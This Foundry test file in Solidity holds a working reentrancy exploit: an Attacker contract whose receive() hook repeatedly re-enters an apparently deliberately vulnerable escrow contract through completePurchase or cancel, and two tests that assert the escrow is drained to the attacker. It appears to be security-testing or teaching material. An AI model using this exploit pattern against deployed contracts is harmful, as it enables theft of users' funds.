// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "../src/EscrowCompromised.sol";
//import "../src/Escrow.sol";

contract Attacker {
    EscrowCompromised public escrow;
    //Escrow public escrow;
    address public attackBuyer;
    uint256 public attackItemId;

    enum AttackFunction { CompletePurchase, Cancel }
    AttackFunction public attackFunction;

    constructor(address payable _escrow) {
        escrow = EscrowCompromised(_escrow);
        //escrow = Escrow(_escrow);
    }

    function setAttackParams(address _buyer2Attack, uint256 _itemId2Attack, AttackFunction _attackFunction) external {
        attackBuyer = _buyer2Attack;
        attackItemId = _itemId2Attack;
        attackFunction = _attackFunction;     
    }

    receive() external payable {

        console.log("Attacker received: ", msg.value / 1e18, "ETH");

        // Start Reentrancy attack
        // reenter if escrow contract has enough balance
        if(address(escrow).balance >= msg.value) {
            console.log("Reentering Escrow contract...");

            // attack via the completePurchase or cancel function
            if (attackFunction == AttackFunction.CompletePurchase) {     
                escrow.completePurchase(attackBuyer, attackItemId);
            } else if (attackFunction == AttackFunction.Cancel) {      
                escrow.cancel(attackItemId);
            }     
        } else {
            console.log("Escrow contract balance is not enough to reenter");
        }
        
    }

}


contract EscrowReentrancyAttackTest is Test {

    EscrowCompromised public escrow;
    Attacker public attacker;

    address public buyer = makeAddr("buyer");
    address public seller = makeAddr("seller");
    address public arbiter = makeAddr("arbiter");
    uint256 public itemId = 1;
    uint256 public price = 1 ether;

    function setUp() public {
        escrow = new EscrowCompromised();
        attacker = new Attacker(payable(address(escrow)));
    }

    function _loadEscrow() private {
        vm.deal(address(escrow), 2 ether);
        console.log("Escrow balance: ", address(escrow).balance / 1e18, "ETH");
    }

    function _createNewEscrowAndDeposit(address _buyer, address _seller, address _arbiter) private {
        vm.prank(_buyer);
        escrow.newEscrow(_buyer, _seller, _arbiter, itemId, price);

        hoax(_buyer, price);
        console.log("Buyer balance before deposit: ", address(_buyer).balance / 1e18, "ETH");
        escrow.deposit{value: price}(itemId);
        console.log("Escrow balance after deposit by buyer: ", address(escrow).balance / 1e18, "ETH");
        console.log("Buyer balance after deposit: ", address(_buyer).balance / 1e18, "ETH");
        
    }

    function test_completePurchase_ReentrancyAttack() public {
        // load escrow contract with ETH
        _loadEscrow();
        
        // create new escrow as buyer
        // set seller and arbiter to the MaliciousSeller contract
        // deposit 1 ETH to escrow
        _createNewEscrowAndDeposit(buyer, address(attacker), address(attacker));

        console.log("Attacker balance before attack: ", address(attacker).balance / 1e18, "ETH");

        // Malicious seller wants to drain the escrow contract balance
        // Attacks as the arbiter 
        // Reentrancy attack via the completePurchase function
        attacker.setAttackParams(buyer, itemId, Attacker.AttackFunction.CompletePurchase);
        vm.prank(address(attacker));
        escrow.completePurchase(buyer, itemId);

        console.log("Escrow balance after attack: ", address(escrow).balance / 1e18, "ETH");
        console.log("Attacker balance after attack: ", address(attacker).balance / 1e18, "ETH");

        assertEq(address(escrow).balance, 0);
        assertEq(address(attacker).balance, 3 ether);
    }

    function test_cancel_ReentrancyAttack() public {
        // load escrow contract with ETH
        _loadEscrow();

        // create new escrow and deposit 1 ETH to escrow
        // attacker is the buyer and deposits 1 ETH
        _createNewEscrowAndDeposit(address(attacker), seller, arbiter);

        // fast-forward 2 days to allow cancellation
        vm.warp(block.timestamp + 2 days);

        console.log("Attacker is the Buyer! Attacker balance before attack: ", address(attacker).balance / 1e18, "ETH");
        
        // Reentrancy attack via the cancel function
        // Attacker claims back his deposit, plus the escrow contract's remaining balance
        attacker.setAttackParams(address(attacker), itemId, Attacker.AttackFunction.Cancel);
        vm.prank(address(attacker));
        escrow.cancel(itemId);

        console.log("Escrow balance after attack: ", address(escrow).balance / 1e18, "ETH");
        console.log("Attacker balance after attack: ", address(attacker).balance / 1e18, "ETH");

        assertEq(address(escrow).balance, 0);
        assertEq(address(attacker).balance, 3 ether);
    }

}
